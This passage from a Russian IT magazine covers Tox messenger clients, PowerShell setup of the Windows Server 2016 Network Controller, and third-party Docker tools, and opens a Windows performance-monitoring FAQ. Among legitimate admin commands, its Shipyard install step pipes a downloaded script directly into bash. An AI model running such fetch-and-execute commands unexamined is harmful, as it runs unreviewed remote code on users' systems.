Функции аудио- и видеосвязи находятся на стадии реализации. Antox можно
установить из репозитория Google Play Beta, созданного Google специально
для тестирования приложений, либо из стороннего репозитория полностью
свободных приложений F-Droid. Приложение пока сырое, и говорить о полно-
ценной замене десктопной версии рано.
  Не забыты и пользователи iOS. Antidote — это клиент Tox для iOS. Поддер-
живает обмен текстовыми сообщениями и файлами, голосовое общение. Ви-
деосвязь пока не реализована. Есть функция шумоподавления и фильтрации
эха. Разработка ведется активно, обновления выходят очень часто, иногда не-
сколько раз в сутки. Справедливо ожидать в ближайшем будущем все функции
протокола Tox в этом приложении.
   Особняком стоит Isotoxin — клиент
Tox для Windows, написанный с нуля
нашим соотечественником под ником
Rotkaermota. Программа написана на
С++. Isotoxin производит очень хоро-
шее впечатление, и это неспроста. В
нем реализована полная поддержка
всех текущих возможностей протоко-
ла Tox, включая видеозвонки. Из дру-
гих фич можно отметить собственный
протокол для общения внутри локаль-
ной сети (создавался в основном для
отладки системы плагинов, но вполне
работоспособен: имеется все то же са-                                                   Isotoxin можно изменять на свое
мое, что в Tox, кроме видео), поддерж-  усмотрение благодаря встроенному
ку одновременной работы нескольких  редактору тем
протоколов (можно, например, иметь сразу два подключения к Tox с разных ID),
продвинутые возможности, такие как метаконтакты, аудио- и видеозвонки, рас-
шаривание десктопа, групповые чаты, поиск по сообщениям, передача файлов,
поддержка «скинов» в интерфейсе. Приложение достаточно стабильно для того,
чтобы рекомендовать его для повседневного использования.


ВЫВОДЫ
Если бы Skype не купила Microsoft, то, возможно, не появился бы протокол Tox.
Самое ценное в Tox — это его по-настоящему полная анонимность. Особен-
ность, которой не может похвастаться ни один из ныне существующих мессен-
джеров. Клиенты Tox в данный момент активно разрабатываются, постоянно
обновляются, появляются новые. В этой статье рассмотрены самые популяр-
ные и распространенные приложения для работы с Tox в Linux. Разумеется, они
не лишены недостатков, как и любые молодые проекты. Но основные функции,
реализованные в протоколе Tox, в них работают исправно и без нареканий.
Установка официальных клиентов несложна и сводится к вводу в консоли не-
скольких простых команд. Будем надеяться, что, когда Tox достигнет соответ-
ствующей стабильности, его и несколько клиентов включат в репозитории ос-
новных дистрибутивов Linux. Лучший пока, безусловно, qTox. Он быстр, падает
меньше всех и выглядит лучше остальных.
  Самое главное, неоспоримое преимущество Tox — это отсутствие како-
го-либо контроля со стороны софтверных компаний. Никто не имеет монопо-
лии на Tox. И это очень хорошо. Это полностью сглаживает все острые углы
и нивелирует любые бывшие, имеющиеся и будущие недостатки Tox. Tox — это
действительно безопасно и анонимно. То, чего все давно ждали.
 SYNACK
СЕТЕВОЙ
КОНТРОЛЛЕР
 РАЗБИРАЕМСЯ С НОВОЙ
 РОЛЬЮ WINDOWS SERVER 2016





     Мартин
 «urban.prankster»
    Пранкевич
   martin@synack.ru
Облачные решения все плотнее смешиваются с при-
вычными, и сегодня определить, на каком сервере
запущено приложение, становится сложнее, да и си-
туация может измениться в любой момент. Помимо
физических сетей, в ЦОД присутствуют сотни вирту-
альных. Управлять этим зоопарком при помощи тра-
диционных сетевых технологий все труднее. В Windows
Server 2016 появился новый элемент Network Controller,
реализующий концепцию программно определяемой
сети (Software Defined Networking).

ВОЗМОЖНОСТИ NETWORK CONTROLLER
Network Controller — новая роль в составе Win 2016, пришедшая из Azure, обе-
спечивает единую точку управления и мониторинга для всех физических и вир-
туальных сетей домена, позволяя из одной точки настраивать IP-подсети, VLAN,
маршрутизаторы и физические сетевые адаптеры Hyper-V-хостов. Используя
Network Controller, мы можем управлять соединениями виртуальных машин
Hyper-V, виртуальными коммутаторами, физическими сетевыми маршрутиза-
торами, настройками файрвола, VPN-шлюзами, в том числе и RRAS, и балан-
сировкой нагрузки. Маршрутизацию обеспечивает использование протокола
Border Gateway Protocol (BGP). Управление правилами брандмауэра позволяет
контролировать трафик в любом направлении, используемом узлами кластера
и отдельными VM. В качестве виртуальных сетей поддерживаются не только
родные для MS NVGRE (Network Virtualization using Generic Routing Encapsulation,
используется от Win 2012), но и VXLAN (Virtual Extensible LAN — VMware, Arista
Networks, Cisco...). Функциональность, как мы видим, не ограничивается толь-
ко виртуальными машинами, управлять можно также физическими сервера-
ми, являющимися частью кластера Windows Server. Для управления функциями
Network Controller реализовано два API:
• Southbound API. Используется для взаимодействия с сетевыми устрой-
   ствами, службами и прочими элементами облака. Именно с его помощью
   обнаруживаются конфигурации и изменения, собираются данные о сети;
• Northbound API. Представляет собой REST-интерфейс. Используется для
   мониторинга и управления сетью при помощи командлетов PowerShell, API
  REST или System Center 2016 Virtual Machine Manager (SCVMM 2016) и System
   Center 2016 Operations Manager (SCOM 2016). В последних двух вариантах
   доступен графический интерфейс.
Сетевой контроллер, используя SNMP и анализ сетевого потока, обнаруживает
проблемы, связанные с задержками и потерями пакетов, и информирует о не-
правильно работающих устройствах в сети. Поддерживается новый инструмент
Microsoft Message Analyzer, пришедший на замену Microsoft Network Monitor, он
позволяет захватывать, отображать и анализировать трафик по различным про-
токолам, отслеживать и оценивать системные события, сообщения устройств,
задержки и потери пакетов, искать и устранять неисправности. Ведется сбор
SNMP-данных, определяется статус работы отдельных устройств. Есть возмож-
ность автоматического обнаружения и группирования устройств по некоторым
характеристикам, с установлением зависимости между физическими и вирту-
альными устройствами. Например, в случае обнаружения проблем с опреде-
ленными сервисами сетевой контроллер помечает все связанные серверы,
VM, маршрутизаторы и прочее как неисправные. Для автоматического обнару-
жения физических и виртуальных серверов в сети используется механизм Data
Center Bridging, реализующий несколько стандартов IEEE 802.1.

УСТАНОВКА РОЛИ NETWORK CONTROLLER
Развернуть Network Controller можно как в доменной, так и в бездоменной сети.
В первом случае аутентификация пользователей и сетевых устройств произво-
дится при помощи Kerberos, во втором потребуются сертификаты. Для знаком-
ства и тестирования можно использовать единственный физический или вирту-
альный сервер. В промышленной среде для обеспечения высокой доступности
следует развернуть кластер из нескольких серверов. Network Controller легко
масштабируется, поэтому новые серверы добавляются в кластер очень про-
сто. Клиенты для управления Network Controller могут использовать не только
серверную ОС, но и Win 8/8.1/10.
   Если узлы с ролью Network Controller развернуты в разных подсетях, сле-
дует в диспетчере DNS разрешить динамические обновления DNS для зоны,
установив в свойствах зоны параметр Dynamic updates в Secure only. Тип зоны
должен быть установлен в Primary или Active Directory-integrated. И установить
разрешения для узлов в Security f Advanced (Безопасность f Дополнитель-
но). Для тестовой среды с одним сервером это не нужно.
  Каждый сервер и клиент, участвующий в соединении, потребует сертификат,
содержащий в поле Subject имя компьютера. Это позволяет разрешить его че-
рез DNS. Сертификаты следует импортировать/экспортировать на остальные
узлы и сделать доверенными для остальных участников. Будем считать, что все
это уже сделано, и на управлении сертификатами останавливаться не будем.
Для тестирования можно сгенерировать самоподписанный сертификат с по-
мощью диспетчера IIS.
   Установить роль Network Controller (Сетевой контроллер) можно при помо-
щи диспетчера сервера, выбрав его в ролях сервера и подтвердив установку
инструментов управления или PowerShell. Команда здесь проста:

PS> Install-WindowsFeature -Name NetworkController
    –IncludeManagementTools





Установка роли «Сетевой контроллер»

По окончании установки в диспетчере сервера появится новая вкладка Network
Controller, позволяющая просмотреть события. Управлять же основными функ-
циями, как уже говорилось, можно при помощи командлетов PowerShell, реше-
ний SCVMM 2016 и SCOM 2016, предлагающих графический интерфейс. По-
следние трогать не будем, разберем PowerShell.
   Модуль NetworkController содержит 45 командлетов. Получить их полный
список можно при помощи

PS> Get-Command -module NetworkController
Все командлеты разбирать точно нет смысла, тем более примеры будут боль-
шие, рассмотрим основные моменты, позволяющие понять суть настроек. К со-
жалению,  документация MS  в  части  использования  Network  Controller
с PowerShell пока весьма скудна, некоторые моменты приходится уточнять экс-
периментально, но разобраться путем проб и ошибок можно. Будем надеять-
ся, что к окончательному релизу эта проблема будет решена.





Командлеты модуля NetworkController

Основой всего является приложение (объект) Network Controller, уже на кото-
ром строится кластер, обеспечивающий высокую доступность и масштабируе-
мость. Причем кластер устанавливается всегда, даже в случае единственного
экземпляра NetworkController.

СОЗДАНИЕ NETWORK CONTROLLER
Для первого конфигурирования сетевого контроллера используется командлет
New-NetworkControllerNodeObject, создающий объект узла сетевого контрол-
лера узла. В качестве параметров необходимо указать имя, REST-интерфейс
(должен выводиться в Get-NetIPConfiguration, иначе получим ошибку в после-
дующем), сервер и отказоустойчивый домен (FaultDomain). Последнее — это
еще одна фишка, пришедшая с Azure, позволяющая «распределить» установки
NetworkController по разным стойкам. В случае выхода из строя одной стой-
ки работоспособность сервиса не будет нарушена. Также опционально можно
указать сертификат при помощи опции NodeCertificate.

PS> $NodeObject = New-NetworkControllerNodeObject -Name “Node1”
    -Server “example.org” -RestInterface “Ethernet0”
    -FaultDomain “fd0:/rack1/host1”





Создаем новый объект

Повторяем эту операцию на всех узлах с ролью NetworkController. Этот объект
используется для создания кластера. В параметрах необходимо указать вид
аутентификации (в случае Active Directory — Kerberos, иначе x509 или None).
Опционально указывается группа безопасности, пользователи которой могут
управлять настройками NetworkController, расположение журналов, использо-
вание SSL и, при необходимости, сертификаты.

PS> Install-NetworkControllerCluster -Node $NodeObject
    -ClusterAuthentication “Kerberos”
    -ManagementSecurityGroup Example\NCAdmins
    -LogLocation “\\example.org\nc”

Для  проверки  параметров  следует  использовать  командлет  GetNetwork
ControllerCluster. Теперь пришла очередь установки собственно сетевого контрол-
лера. Параметры Install-NetworkController практически совпадают с параметрами
предыдущего командлета, необходимо обязательно указать сертификат. Список
всех сертификатов и их свойств можно получить при помощи Get-ChildItem и Get-
Item. Предположим, у нас уже есть сертификат с именем сервера.

PS> $Certificate = Get-Item Cert:\LocalMachine | Get-ChildItem |
    where {$_.Subject -imatch “example.org” }
PS> Install-NetworkController -Node $NodeObject
    -ClientAuthentication “Kerberos” -ServerCertificate $Certificate
    -EnableAllLogs





Устанавливаем сетевой контроллер

Установка может занять некоторое время. По окончании будет выведе-
на таблица настроек, просмотреть которую впоследствии можно, запу-
стив Get-NetworkController. Изменить в дальнейшем можно при помощи Set-
NetworkController.
  В документации не сказано, но последующие настройки у меня заработали
только после перезагрузки сервера, до нее командлеты постоянно выдавали
ошибку. Для управления сетевым контроллером нужны учетные данные. При-
чем потребуется два типа: учетные данные пользователя (обычные или домен-
ные) — для управления и учетные данные SNMP — для получения информации
о конфигурации по соответствующему протоколу. В качестве параметров нуж-
но указать URI, свойства и идентификатор учетных данных.
PS> $cred = New-Object Microsoft.Windows.NetworkController.
    CredentialProperties
PS> $cred.type = “usernamepassword”
PS> $cred.username = “domain\admin”
PS> $cred.value = “passwd”

В случае SNMP в качестве $cred.type используется

PS> $cred.type = “snmpCommunityString”

И указываем свой пароль. Создаем:

PS> New-NetworkControllerCredential -ConnectionUri
    “https://example.org” -Properties $сred –ResourceId “Cred1”





Настраиваем учетные данные

Соответственно, для SNMP укажем свой Properties и ResourceId. Сразу же
и проверим:

PS> Get-NetworkControllerCredential -ConnectionUri
    “https://example.org” -ResourceId Cred1

Все работает. Параметры сети и узлов можно ввести вручную, но лучше опре-
делить их автоматически. Для этого следует настроить параметры сканирова-
ния сети и запустить процесс обнаружения.

PS> $config = New-Object Microsoft.Windows.Networkcontroller.
    ConfigurationProperties
PS> $config.DiscoverHosts = “true”
По умолчанию интервал обнаружения установлен в 1440 минут, для тестирова-
ния лучше его уменьшить, иначе информацию ждать будем долго:

PS> $config.DiscoveryIntervalInMinutes = “10”

Подсети, в которых будет производиться обнаружение устройств:

PS> $config.DiscoveryScopes = “10.0.0.0/24,192.168.0.0/24”

Получаем учетные данные, созданные ранее. Если создано несколько пользо-
вателей, то задаем их здесь, а при опросе устройств они будут перебираться
до совпадения.

PS> $credential = Get-NetworkControllerCredential
    –ConnectionUri https://example.org –ResourceId Сred1
PS> $config.Credentials = $credential

IP-адрес устройства, которое будет использовано в качестве отправной точки
для поиска в сети:

PS> $config.DiscoverySeedDevices = “192.168.0.1”

Ограничение по глубине поиска устройств:

PS> $config.HopLimit = “3”
PS> $config.ActiveDirectoryDomains = “example.org”

Применяем установки:

PS> Set-NetworkControllerTopologyConfiguration
    –ConnectionUri https://example.org –Properties $config

Проверяем настройки:

PS> $topology = Get-NetworkControllerDiscoveredTopology
    -ConnectionUri https://example.org
PS> $topology.Properties
Запускаем процесс поиска и идентификации сетевых устройств:

PS> $discovery = New-Object Microsoft.Windows.NetworkController.
    NetworkDiscoveryActionProperties
PS> $discovery.Action = “start”
PS> Invoke-NetworkControllerTopologyDiscovery
    –ConnectionUri https://example.org –Properties $disсovery





Настраиваем процесс обнаружения

Некоторое время ждем, чтобы просмотреть результат. По каждому узлу соби-
раются данные об имени, ОС, типе, модели, состоянии и прочему. В Windows
для возможности обнаружения систем следует включить DCB, установив соот-
ветствующий компонент:

PS> Install-WindowsFeature Data-Center-Bridging

После этого нужно проверить в свойствах сетевых устройств, чтобы был установ-
лен флажок в параметрах Microsoft LLDP Protocol Driver и QoS Packet Scheduler.
Включить также можно при помощи командлета:

PS> Enable-NetAdapterQoS “Ethernet0”

Состояние DCB выводится при помощи Get-NetQoSDCBxSetting. Статистика
по обнаружению устройств и времени последнего запуска просматривается
при помощи командлета Get-NetworkControllerTopologyDiscoveryStatistics:

PS> Get-NetworkControllerTopologyDiscoveryStatistics
    -ConnectionUri https://example.org
Теперь смотрим информацию о топологии, обнаруженных узлах и связях:

PS> $topology = Get-NetworkControllerDiscoveredTopology
    -ConnectionUri https://example.org

Получим массив узлов.

PS> $topology.Properties

Свойства одного узла:

PS> $topology.Properties.TopologyNodes[0].Properties

Просмотр связей:

PS> $topology.Properties.TopologyLinks[0].Properties

Есть и специальные командлеты, позволяющие получить те же данные более про-
сто: Get-NetworkControllerDiscoveredTopologyLink, Get-NetworkControllerDiscover
edTopologyNode и Get-NetworkControllerDiscoveredTopologyTerminationPoint.
  В зависимости от ситуации некоторые узлы будут отмечены как недоступные,
это может значить, что узел найден, но получена не вся необходимая информа-
ция. После нескольких проверок статус может измениться. Вполне возможно,
что потребуется вручную указать или убрать узлы и настроить связи между уз-
лами. Для этого используется несколько NetworkControllerDiscoveredTopology
командлетов с префиксом New- и Remove-.
   Добавить данные о сетях и IP-пуле позволяют командлеты New-NetworkController
LogicalNetwork, New-NetworkControllerLogicalSubnet и New-NetworkControllerIpPool.

ВЫВОД
Появление новой роли явно показывает перспективы развития сетей в будущем.
Очевидно, ставка делается на гибридные сети и облачные сервисы. Конфигу-
рирование при помощи PowerShell нельзя назвать простым и в больших сетях
наглядным, но зато каждое действие полностью контролируется, а возможно-
сти использования скриптов позволяют легко автоматизировать процесс.
SYNACK
ЖОНГЛИРУЕМ
КОНТЕЙНЕРАМИ
РАЗНЫЕ ПОЛЕЗНЫЕ
ПЛЮШКИ ДЛЯ DOCKER

                                                                                Мартин
                                                                                            «urban.prankster»
                                                                                    Пранкевич
                                                                                                    martin@synack.ru
Появившись, Docker практически сразу стал интере-
сен IT-шникам, которые получили в руки удобный ин-
струмент для безопасного и быстрого развертывания
приложений. Но, немного поигравшись, понимаешь,
что базового набора недостаточно. Большая популяр-
ность проекта привела к тому, что он мгновенно оброс
сопутствующими субпроектами и хаками, предлагаю-
щими улучшения и устранения известных недостатков.

МОНИТОРИНГ
Запуск ПО в продакшене без мониторинга в чем-то похож на вождение с завя-
занными глазами: когда-нибудь точно врежешься. Традиционные решения для
мониторинга покрывают две проблемы: сбор метрик хоста и мониторинг конкрет-
ного приложения. Но контейнеры Docker находятся по положению где-то между
ними, это не хост и не приложение, а значит, оба эти способа неэффективны.
Кроме того, контейнеры постоянно появляются и исчезают, следить за каждым
обычным способом нельзя. То есть без специальных средств не обойтись.
   Docker предоставляется со встроенными функциями мониторинга, позволя-
ющими контролировать все важные показатели CPU, Mem, I/O и сеть. Причем
предлагает для их считывания аж три способа: при помощи sysfs (расположены
в /sys/fs/cgroup), команды stat и API.

$ cat /sys/fs/cgroup/cpuacct/docker/CONTAINER_ID/cpuacct.stat
$ docker stats CONTAINER_ID

Доступ к API также получить очень просто, достаточно прочитать данные из сокета.

$ echo -e “GET /containers/[CONTAINER_ID]/stats HTTP/1.0\r\n” |
    nc -U /var/run/docker.sock

Кроме этого, часть stdout/stderr информации Docker выводит в файл журнала.
В Ubuntu это /var/lib/docker.log.





Статистика работы контейнера
Штатные инструменты дают общие сведения по нагрузке в конкретный момент
времени, но не ведут статистику и не выдают предупреждения, а поэтому не пре-
доставляют возможности полноценно контролировать использование ресурсов
и характеристики контейнеров. Наглядностью данные тоже не отличаются. Нали-
чие API позволило сторонним разработчикам создать свои приложения.
  Одно из самых популярных, cAdvisor, представляет собой специальный де-
мон, который собирает статистику об общем использовании ресурсов, сете-
вом трафике и установленных пределах и отображает информацию в графи-
ческом виде. Новый контейнер автоматически подхватывается cAdvisor, и по
нему выводится временной ряд. В отдельной вкладке предоставляются дан-
ные по конкретному контейнеру. Поддерживает потоки событий — создание,
удаление, аномальные события. По умолчанию данные на графиках в скользя-
щем окне показываются только за одну минуту. Нет возможности посмотреть
более долгосрочные тенденции и получить предупреждение о достижении
лимита. Хотя, вероятно, для разработки этого вполне и достаточно. Для хра-
нения долгосрочных метрик cAdvisor интегрируется с InfluxDB и планируется
с Google BigQuery. Для интеграции с InfluxDB достаточно указать в строке запу-
ска -storage_driver=influxdb.
   cAdvisor реализован и как контейнер Docker, поэтому его получить проще
простого (есть возможность запуска вне Docker).

$ docker run --volume=/:/rootfs:ro --volume=/var/run:/var/run:rw
    --volume=/sys:/sys:ro
    --volume=/var/lib/docker/:/var/lib/docker:ro
    --publish=8080:8080 --detach=true
    --name=cadvisor google/cadvisor

Теперь, чтобы подключиться, достаточно набрать http://localhost:8080. Кро-
ме ограничения в периоде выводимой информации, у cAdvisor есть еще один
недостаток — он может контролировать только один хост Docker. Поэтому он
не совсем подходит для использования в кластере из нескольких установок
Docker.
   Axibase Time-Series Database — решение, использующее метрики произво-
дительности, снятые cAdvisor (собственной доработанной версии), но умеющее
их хранить, анализировать и визуализировать. Один экземпляр ATSD может со-
брать метрики нескольких хостов Docker и cAdvisor. Статистика отправляется
по протоколу TCP, по умолчанию это локальный адрес, но удаленную систе-
му можно указать при запуске с помощью параметров --atsd_storage_url
и --atsd_storage_write_host. Также ATSD может собирать данные с демо-
нов collectd, tcollector или Nmon, запущенных внутри контейнеров. Это позво-
лит получать и анализировать в последующем еще большую информацию.
  Среди open source решений следует вспомнить о системе мониторинга
Prometheus, описанной в сентябрьском номере. Она полностью ориентирова-
на на микросервисную архитектуру и поддерживает Docker из коробки.
   Если развернута система мониторинга Zabbix, можно использовать специ-
альный модуль, показывающий общую информацию о нагрузке системы и дан-
ные об отдельных контейнерах.





Вывод статистики в cAdvisor

ЖУРНАЛЫ
Без журналов приложений тяжело понять суть возникшей ошибки, появившей-
ся при работе сервиса. В Docker, чтобы получить журнал, требуется решить две
проблемы: нужные данные надо собрать и доставить наружу, полученные дан-
ные — сохранить.
  По умолчанию наружу контейнера доступен вывод STDOUT, а поэтому до-
статочно в него направить логи приложения и затем просматривать при помо-
щи docker logs -f <название_контейнера>. Но в этом случае нужно быть точно
уверенным, что в STDOUT попадает все необходимое. О сохранении и анали-
зе в дальнейшем придется позаботиться отдельно. Правда, нужно помнить,
что при запуске контейнера с опцией -t STDOUT будет уходить в открытый псев-
доTTY.
   Теперь как собрать. Используя параметр --log-driver в команде запуска
контейнера docker run, можно журнал контейнера направлять в syslog, journald,
fluentd, файл JSON и так далее.

$ docker run ubuntu --log-driver=syslog
    --log-opt syslog-address=udp://192.168.0.1:514
    --log-opt labels=ubuntu

В репозитории легко найти контейнер, реализующий syslog, поэтому развер-
нуть такую схему достаточно легко. К сообщению можно добавлять метки, что-
бы легче было найти нужные данные в общем файле. При этом предусмотрено
использование подстановок. Например, тег {{.Name}} выведет имя контейне-
ра, а {{.ID}} — его идентификатор.
   Другой вариант — смонтировать каталог с журналами, добавив -v /var/
log/:/var/log/, и таким образом получить доступ к ним. Но при большом ко-
личестве контейнеров такой вариант не всегда удобен. В ответ на проблемы
появились и сторонние разработки, их решающие.
   Проект logspout реализует простую функцию — собирает логи со всех за-
пущенных контейнеров (STDOUT, STDERR и пока частично syslog) и отправляет
на удаленный хост.

$ docker run –name=”logspout”
    --volume=/var/run/docker.sock:/tmp/docker.sock
    gliderlabs/logspout syslog://example.org:514

Модульная конструкция позволяет расширять возможности. Например, мо-
дуль httpstream выводит поток логов в реальном времени. Для тех контейне-
ров, журналы которых нужно игнорировать при запуске, следует добавлять
-e ‘LOGSPOUT=ignore’.
   Logjam умеет собирать журналы с локального UDP-сокета или файла и от-
правлять на удаленный адрес. В качестве агрегатора журналов для Docker
часто используют logstash — специальное приложение, умеющее собирать,
фильтровать, нормализовать и хранить любые данные в любом формате.
ИНТЕРФЕЙС
Управлять большим количеством контейнеров и образов без наглядного
интерфейса не очень удобно, особенно если запускать контейнеры долж-
ны малоподготовленные пользователи. Официальный проект предоставля-
ет только GUI Docker Kitematic, который доступен для OS X 10.9+ и Windows
7+ 64-bit, позволяющий быстро развернуть, сконфигурировать среду Docker,
управлять ею и запускать контейнеры (через VirtualBox). Но в нашем случае он
не подходит.
   Хотя это не проблема, так как на сегодня доступно уже несколько десятков
реализаций сторонних разработчиков. Проекты опираются на Docker Remote
API, позволяющий производить все манипуляции, доступные в командной
строке. Shipyard, наверное, самый продвинутый и идеальный интерфейс для
удобной работы со всеми функциями Docker. С его помощью удобно запу-
скать, перезапускать, уничтожать, создавать, получать подробную информа-
цию о контейнерах (статус, использование, время создания, порты, процессы
и прочее), просматривать журналы контейнеров. Также он выводит статисти-
ку по использованию CPU, памяти и сети, выводит логи. Реализован просмотр
доступных образов и работа с тегами, просмотр узлов и IP. Есть возможность
запуска команд при помощи docker exec. Поддерживается работа в много-
пользовательской среде, интеграция с OpenLDAP и Active Directory. Пользова-
телям назначаются роли, дающие разные права. Список ролей фиксированный
и содержит одиннадцать вариантов, то есть его вполне достаточно для боль-
шинства задач. Для хранения данных используется RethinkDB. Поддерживает-
ся кластер Docker Swarm, позволяющий объединить несколько Docker-хостов
в один виртуальный. Получить его просто:

$ curl -sSL https://shipyard-project.com/deploy | ACTION=deploy bash -s

Все параметры, которые можно использовать для сборки и сборки в качестве
ноды в Swarm, расписаны в документации. По умолчанию используется 8080-
й порт, логин/пароль — admin/shipyard. Остальные параметры (подключение
к LDAP, внешней RethinkDB, сертификаты и прочее) можно узнать при помощи
команды

$ docker run shipyard/shipyard server -h
Управление контейнером в Shipyard


Если нужен инструмент попроще, то можно порекомендовать Dockerding, по-
зволяющий управлять контейнерами, получать информацию по каждому (ID, об-
раз, команда, статус, сетевые настройки, переменные и так далее), запускать,
останавливать, перезапускать и удалять, просматривать журналы работы, соз-
давать новый контейнер, для чего нужно просто заполнить предложенные поля.
Все функции доступны в двух пунктах меню, запутаться в которых просто невоз-
можно. По работе с образами пока реализована общая информация и возмож-
ность удаления. Простой и понятный инструмент, позволяющий не вспоминать
названия команд и контейнеров, а сразу получать все данные.

$ docker pull evolutio/dockerding
$ docker run -d -p 3000:3000 --privileged --name dockerding
    -v /var/run/docker.sock:/var/run/docker.sock evolutio/dockerding
Набираем http://localhost:3000 и можем работать.





Интерфейс Dockerding

УПРАВЛЕНИЕ СОБСТВЕННЫМ РЕПОЗИТОРИЕМ
Когда собранных образов становится много, следует задуматься о частном
репозитории. Для создания собственного репозитория разработчики Docker
предлагают Docker Registry, к которому уже сегодня доступен десяток самых
разных интерфейсов.
   Docker Registry UI — веб-интерфейс для Docker Registry, позволяющий соз-
давать приватный репозиторий, просматривать список образов, производить
поиск и удаление образов, просматривать конфигурацию. Поддерживается
управление несколькими репозиториями. Конфигурация по умолчанию сохра-
няется во внутренней базе H2, но можно подключаться и к внешней H2. Запуск
прост. Вначале нам понадобится сам Docker Registry.

$ sudo docker run -p 5000:5000 registry
Запускаем, указав URL нужного репозитория (использовать localhost нельзя),
хотя при необходимости подключить любое количество можно впоследствии
и через веб-интерфейс.

$ sudo docker run -p 8080:8080 -e REG1=http://example.org:5000/v1/
    atcol/docker-registry-ui

Теперь смотрим в браузере страницу http://example.org:8080. Репозиторий
должен быть показан во вкладке Registeres, а статус обязательно должен сооб-
щать Ping succeeded. После этого в Images найдем все образы, добавленные
в репозиторий. Параметр -e READ_ONLY=true позволяет запускать контейнер
в режиме «только чтение».





Подключение к репозиторию в Docker Registry UI

Те, кому нужен инструмент с большими функциями, должны обратить внима-
ние на Portus, предлагающий улучшенные возможности по авторизации поль-
зователей на основе ролей. Организация может иметь команды (teams). Кроме
этого, предоставляются наборы пространств имен (namespaces), представля-
ющих собой коллекцию репозиториев. Сами namespaces могут принадлежать
конкретной команде, быть глобальными или персональными. Пользователи
в namespaces могут иметь один из трех уровней доступа: Viewers (только полу-
чение образов), Contributors (плюс публикация образов) и Owners (плюс управ-
ление составом команды). Есть функция временного отключения пользовате-
лей. Реализован поиск в реестре, аудит (все события регистрируются), рейтинг
хранилищ. Поддерживается аутентификация по протоколу LDAP.

РАЗРАБОТКА И СБОРКА
Развертывание и тестирование — самая сложная часть проекта. Когда количе-
ство сборок начинает превышать определенный предел, задумываешься о не-
которой автоматизации и возможности контроля изменений.
  Одна из популярных систем контроля версий Git вполне подходит для хра-
нения версий Dockerfile и связанных с проектом файлов. Captain позволяет ав-
томатизировать сборку новых контейнеров при коммите. Контейнеры в зави-
симости от настроек автоматически получают номер сборки. Предусмотрено
тестирование сборки и отправка в репозиторий.
   Zodiac — инструмент, использующий Docker Compose, упрощающий раз-
вертывание и откат к нужной версии при сборке контейнеров. Работает очень
просто. После создания docker-compose.yml производится сборка проекта
zodiac deploy. Затем после внесения изменений в docker-compose.yml опера-
ция повторяется. Список zodiac list покажет все сборки. Если после тестирова-
ния необходимо откатиться до предыдущей, то просто вводим «zodiac rollback
номер_сборки».
   Rocker-compose — приложение, идущее на замену официальному Docker
Compose, предназначенному для запуска мультиконтейнерных окружений, но
обладающее рядом полезных возможностей. Автоматически удаляются кон-
тейнеры, которые больше не используются в конфигурации. В случае краха пе-
резапускается только проблемный контейнер, а не все. Поддерживаются на-
страиваемые имена в названиях контейнеров (Docker Compose не понимает
символы подчеркивания). При пересборке проекта сохраняется имя контей-
нера, это упрощает сопровождение и избавляет от сообщений, что имя занято
и старый контейнер нужно удалить. Использование шаблонов в файле манифе-
ста (не только ENV).

АЛЬТЕРНАТИВНЫЙ ОБРАЗ BASEIMAGE-DOCKER
Образы для Docker распространяются через репозитории, откуда их можно
скачать или загрузить. Для Docker официальным является Docker Hub, содер-
жащий огромное количество образов, в том числе и предоставленные сторон-
ними фирмами и разработчиками. Многие образы похожи по принципу, так как
созданы из основных, доступных в репозитории, без особой переделки внутри.
Но есть интересные проекты. Так, самый популярный образ сторонних разра-
ботчиков — Baseimage-docker, доступный как phusion/baseimage. Одна из при-
чин его появления — проблема PID 1, возникшая из-за того, что многие дистри-
бутивы Linux изначально не рассчитаны на применение в контейнерах. Docker
получается не совсем Linux и не использует единый init-процесс для инициа-
лизации и остановки всех дочерних процессов контейнера, как это принято
в Linux. В случае Docker первым процессом может быть что угодно, даже CMD.
В результате это может привести к большому количеству зомби-процессов,
так как SIGTERM некорректно отрабатывается при остановке системы и пере-
запуске сервиса, что приводит еще и к потере данных. В некоторых ситуаци-
ях (например, тестирование приложения) это, может, и неважно, но веб-сайт
держать в таком контейнере проблематично. Baseimage-docker поставляется
с собственной системой инициализации /sbin/my_init, являющейся родите-
лем для всех процессов в контейнере.
  Еще один момент. Docker построен вокруг идеи о том, что в каждом контей-
нере должен работать только один сервис. Все важные системные службы не
запускаются автоматически, об этом необходимо позаботиться самому. При
необходимости сервисы связываются. Такой подход дает большую гибкость,
так как позволяет с легкостью менять конфигурацию, тестировать обновления
и выполнять миграцию отдельных сервисов на другие машины. Поэтому в окру-
жении нет корректного syslog, crond и прочих демонов, требуемых для нормаль-
ной работы любой UNIX-системы и приложений, а это вызывает проблемы. В об-
разах нет SSH, а до появления docker exec в Docker 1.4 дать команду внутри
контейнера было непросто. В Baseimage-docker используется runit, позволяю-
щий добавлять дополнительные приложения к образу. Специальный инструмент
setuser позволяет запускать разные демоны от разных учетных записей.

                                                               Процессы
                                                                    в Baseimage-
                                                                        docker
                                                                           с обычным
                                                                  контейнером
ВЫВОД
Это далеко не полный список дополнительных приложений, расширяющих ба-
зовые возможности Docker. Хорошо поискав в интернете, можно найти реше-
ния для простого управления сетью, простого деплоя, непрерывной интегра-
ции и доставки, создания и проверки Docker-файлов, менеджеры кластеров
и многое другое.
FAQ



                                        Алексей Zemond
                                            Панкратов
                                           3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)
АНАЛИЗИРУЕМ ЗАГРУЖЕННОСТЬ ОБОРУДОВАНИЯ
ШТАТНЫМИ СРЕДСТВАМИ WINDOWS

Когда уже настроено все, что только можно, а компьютер упорно продолжает вис-
нуть или тормозить, остается только засучить рукава и браться за тестирование обо-
рудования. В этом поможет самый разный софт, но давай попробуем обратиться
к штатным средствам Windows. Они весьма неплохи и, главное, всегда под рукой.
   Предполагаю, что ты слышал про Performance Monitor, именно он нам и помо-
жет. Думаю, вопросов о том, где он находится, не должно быть, но если вдруг за-
памятовал, то ищи его в меню «Пуск» (стартовый экран в Server 2012), в разделе
Administrative tools. Или, если привык к командной строке, запускай perfmon.msc.
   Без подготовки не так-то просто разобраться в огромном количестве счет-
чиков. Но, поверь, проанализировав систему пару-тройку раз, ты будешь ори-
ентироваться в них с закрытыми глазами. Для начала предлагаю определиться
с тем, что будем измерять. Нас интересуют следующие параметры:
•  Memory f Pages/sec
•  Processor [_Total] f %Processor Time
•  System f Processor Queue Length
•  Physical Disk f Avg. Disk Queue Length
•  Network Interface f Bytes Total / sec

